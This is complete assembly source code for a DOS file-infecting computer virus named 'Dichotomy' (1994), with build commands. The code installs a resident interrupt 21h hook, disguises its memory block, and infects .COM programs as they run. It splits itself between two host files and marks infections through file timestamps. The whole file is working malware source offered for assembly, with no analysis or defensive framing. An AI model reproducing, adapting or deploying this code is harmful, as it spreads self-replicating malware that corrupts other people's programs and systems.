;       Dichotomy Virus
;       (c) 1994 Evil Avatar
;
; TASM /M3 DIKOTOMY
; TLINK /X DIKOTOMY
; EXE2BIN DIKOTOMY DIKOTOMY.COM

.model tiny
.code
org 0

;=====( Entry point for COM files )========================================

Dichotomy:
          call delta
delta:    mov bx, sp
          mov bp, word ptr ds:[bx]
          sub bp, offset delta          ;get delta offset
          inc sp
          inc sp
          cmp word ptr ds:[bp+virus1], 'D['
          mov ah, 1ah
          lea dx, [bp+newDTA]           ;buffer for new DTA
          int 21h                       ;set new disk transfer address
          mov ah, 4eh
          mov cx, 7                     ;any attribute
          lea dx, [bp+FileName]         ;host name
          int 21h                       ;find second host file
          jc maybe_host                 ;if carry, then we need a new host
          mov ax, 3d00h
          int 21h                       ;open second host
          xchg ax, bx                   ;handle is better in bx
          mov ax, 4200h
          sub cx, cx
          mov dx, word ptr ds:[bp+newDTA+1ah]
          sub dx, (offset heap-offset loader2)
          int 21h                       ;move pointer to virus code
          mov ah, 3fh
          mov cx, (offset heap-offset loader2)
          lea dx, [bp+loader2]
          int 21h                       ;read in second part of virus
          mov ah, 3eh
          int 21h                       ;close the file
maybe_host:
          mov ah, 51h
          int 21h                       ;check if resident
          inc bx                        ;if resident, PSP should be -1
          jz resident                   ;yes? kewl!
          cmp word ptr ds:[bp+virus1], 'D['     ;check if we are fully here
          je go_res                     ;yes? we need to go resident
return:   mov ah, 1ah
          mov dx, 80h
          int 21h                       ;restore DTA
          lea si, [bp+comfix]           ;offset of first 3 bytes of file
          mov di, 100h                  ;start of .com file
          mov ax, di
          push ax
          movsw
          movsb
          retn
resident: cmp word ptr ds:[bp+virus1], 'D['     ;is the second host here?
          je return                     ;yes? return to program
          mov ah, 62h
          int 21h                       ;request new host
          jmp return                    ;return to host
go_res:   jmp loader2                   ;go memory resident

;=====( Variables )========================================================

comfix    db 0cdh, 20h, 0               ;first 3 bytes of .com file
virus     db '[Dichotomy]', 0           ;virus name
author    db '(c) 1994 Evil Avatar', 0  ;me
FileName  db 'DIKOTOMY.COM', 0, 73h dup (?)     ;second host name
loader1_end:

;=====( Go memory resident )===============================================

loader2:
          mov byte ptr ds:[bp+count], 0 ;infections = 0
          mov ah, 'E'
          xor ah, 0fh
          mov bx, -1
          int 21h                       ;get available memory
          mov ah, 'A'
          xor ah, 0bh
          sub bx, (virus_end-Dichotomy+15)/16+1
          int 21h                       ;create a hole in memory
          mov ax, 3521h
          int 21h                       ;get int 21h handler
          mov word ptr [bp+save21], bx
          mov word ptr [bp+save21+2], es        ;save int 21h vector
          mov ah, 'E'
          xor ah, 0dh
          mov bx, (virus_end-Dichotomy+15)/16
          int 21h                       ;allocate the memory
          mov es, ax                    ;es is high virus segment
          mov cx, (virus_end-Dichotomy+1)/2
          lea si, [bp+Dichotomy]
          sub di, di
          rep movsw                     ;copy ourself up there
          push es
          pop ds                        ;save virus seg for int 21h change
          dec ax                        ;MCB segment
          mov es, ax
          mov word ptr es:[1], 8        ;make DOS the owner of our segment
          mov ax, 4541h
          sub ax, 2020h
          lea dx, [int21]
          int 21h                       ;set new int 21h handler
          push cs cs
          pop ds es                     ;restore PSP segments
          jmp return                    ;return to host

;=====( Find a new host )==================================================

request:  push ds di si cx cs
          pop ds                        ;save registers
          mov di, bp                    ;set up scan registers
          sub si, si
          mov cx, 5
          repe cmpsw                    ;scan to see if it is us
          jne restore1                  ;no? let dos take care of it
          mov ax, 4300h
          lea dx, [WhatRun]
          int 21h                       ;get attributes of file
          push cx                       ;save them
          mov ax, 4301h
          sub cx, cx
          int 21h                       ;clear attributes
          mov ax, 3d02h
          int 21h                       ;open file read/write
          xchg ax, bx
          mov ax, 5700h
          int 21h                       ;get file date/time
          and cx, 1fh                   ;get seconds
          cmp cx, 1fh                   ;is it 62?
          je cant_fix                   ;can't fix this file
          mov ax, 4202h
          sub cx, cx
          cwd
          int 21h                       ;go to end of file
          mov ah, 40h
          mov cx, (heap-loader2)
          lea dx, [loader2]
          int 21h                       ;copy to end of file
          mov ax, 5700h
          int 21h                       ;get file date/time
          or cx, 1fh
          mov ax, 5701h
          int 21h
cant_fix: mov ax, 4301h
          pop cx                        ;get attributes
          int 21h                       ;restore attributes
          mov ah, 3eh
          int 21h                       ;close file
restore1: pop cx si di ds               ;restore registers
          jmp dos21                     ;go to dos

;=====( Interrupt 21h handler )============================================

int21:    inc ah
          cmp ah, 4ch                   ;execute file
          je infect                     ;infect it
          dec ah
          cmp ah, 51h                   ;install check
          je install_check
          cmp ah, 62h                   ;request for new host
          je _request
dos21:    jmp dword ptr cs:[save21]     ;call dos
_request: jmp request

;=====( Installation check )===============================================

install_check:
          push di si cx ds cs
          pop ds                        ;save registers
          mov di, bp                    ;set up scan registers
          sub si, si
          mov cx, 5
          repe cmpsw                    ;scan to see if it is us
          jne restore                   ;no? let dos take care of it
          mov bx, -1                    ;return code
          pop ds                        ;restore ds
          add sp, 6                     ;fix stack
          iret                          ;return
restore:  pop cx si di ds               ;restore registers
          jmp dos21                     ;go to dos

;=====( Infection routine )================================================

infect:   dec ah
          call push_all                 ;save registers
          push cs
          pop es                        ;es equals code segment
          mov si, dx
          lea di, [WhatRun]
          mov cx, 40h
          rep movsw                     ;save filename in buffer
          mov si, dx                    ;ds:si equals file name
          lea di, [FileName]
          mov ax, 4300h
          int 21h                       ;get attributes of file
          push cx                       ;save them
          mov ax, 4301h
          sub cx, cx
          int 21h                       ;clear attributes
          mov ax, 3d02h
          int 21h                       ;open file read/write
          xchg ax, bx                   ;put handle in bx
          mov ax, 5700h
          int 21h                       ;get file time/date
          and cx, 1fh                   ;get seconds
          cmp cx, 1eh                   ;is 60 or 62?
          jae already_inf               ;then already infected
          lodsb                         ;get drive letter
          dec si                        ;point to filename again
          and al, 5fh                   ;make it uppercase
          cmp al, 'C'                   ;is it C or higher?
          jb _single                    ;no? we must fully infect it
          cmp byte ptr cs:[count], 1    ;have we already done loader 2?
          jne do_loader2                ;yes? start doing loader 1s
do_loader1:
          call inf_loader1
          jmp done_inf
do_loader2:          
          call inf_loader2
          jmp done_inf
_single:  push si di
          mov cx, 40h
          rep movsw                     ;save filename in buffer
          pop di si
          call inf_loader1
          call inf_loader2
          mov byte ptr cs:[count], 0
done_inf: mov ah, 3eh
          int 21h                       ;close file
already_inf:
          mov ax, 4301h
          pop cx                        ;get attributes
          int 21h                       ;restore attributes
          call pop_all                  ;restore registers
          jmp dos21                     ;call dos

;=====( Infect file with loader 1 )========================================

inf_loader1:
          push si di ds dx cs           ;save filename and other stuff
          pop ds
          mov byte ptr ds:[count], 0    ;do loader 2 from now on
          mov ah, 3fh
          mov cx, 3
          lea dx, [comfix]
          int 21h                       ;read in first 3 bytes
          mov ax, 4202h
          sub cx, cx
          cwd
          int 21h                       ;go to end of file
          or dx, dx
          jnz bad_file
          cmp ax, 65024-(virus_end-Dichotomy)   ;see if file is too big
          jae bad_file
          mov cx, word ptr ds:[comfix]
          cmp cx, 'M'+'Z'
          jz bad_file                   ;can't infect .exe's
          sub ax, 3                     ;calculate jump
          mov word ptr ds:[buffer], ax  ;set up jump
          mov ah, 40h
          mov cx, (loader1_end-Dichotomy)
          cwd
          int 21h                       ;copy virus to end of file
          mov ax, 4200h
          sub cx, cx
          cwd
          int 21h                       ;go to beginning of file
          mov ah, 40h
          mov cx, 3
          lea dx, [buffer-1]
          int 21h                       ;copy jump to beginning
          mov ax, 5700h
          int 21h                       ;get file time/date
          mov ax, 5701h
          or cx, 1eh
          and cx, 0fffeh                ;set to 60 seconds
          int 21h                       ;set new file time
bad_file: pop dx ds di si
          retn

;=====( Infect file with loader 2 )========================================

inf_loader2:
          push ds dx                    ;save file name
          mov cx, 40h
          rep movsw                     ;save filename in buffer
          push cs
          pop ds                        ;ds needs to be code segment
          mov byte ptr ds:[count], 1    ;do loader 1 from now on
          mov ax, 4202h
          sub cx, cx
          cwd
          int 21h                       ;go to end of file
          mov ah, 40h
          mov cx, (heap-loader2)
          lea dx, [loader2]
          int 21h                       ;copy to end of file
          mov ax, 5700h
          int 21h                       ;get file date/time
          or cx, 1fh                    ;set to 62 seconds
          mov ax, 5701h
          int 21h                       ;set new file time
          pop dx ds                     ;restore file name
          retn                          ;return to caller

;=====( Push all registers )===============================================

push_all: pop word ptr cs:[p_all]       ;save return code
          push ax bx cx dx bp si di ds es       ;save registers
          pushf                         ;save flags
          jmp word ptr cs:[p_all]       ;return to caller

;=====( Pop all registers )================================================

pop_all:  pop word ptr cs:[p_all]       ;save return code
          popf                          ;restore flags
          pop es ds di si bp dx cx bx ax        ;restore registers
          jmp word ptr cs:[p_all]       ;return to caller

;=====( More variables )===================================================

virus1    db '[Dichotomy]', 0           ;virus signature
          db 0e9h                       ;jump cs:xxxx
heap:
buffer    dw ?                          ;jump buffer
newDTA    db 2bh dup (?)                ;replacement disk transfer address
save21    dd ?                          ;interrupt 21h vector
p_all     dw ?                          ;push/pop return value
count     db ?                          ;infection count
WhatRun   db 80h dup (?)
virus_end:
end Dichotomy
